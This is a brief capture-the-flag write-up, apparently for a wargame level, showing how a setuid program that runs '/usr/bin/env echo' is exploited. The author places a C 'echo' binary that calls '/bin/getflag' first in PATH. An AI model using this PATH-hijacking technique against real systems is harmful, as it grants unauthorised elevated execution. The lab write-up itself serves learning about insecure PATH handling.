The program executed `/usr/bin/env echo <args>` which means we can modify our
PATH with a custom binary named `echo` and that's basically what I did. I wrote
an `echo.c` with the following contents:
{{{c
    #include <stdlib.h>

    int
    main(void)
    {
        system("/bin/getflag");
    }
}}}

compiling and executing `/home/flag01/flag01` tells us that we were successful
with the exploit.
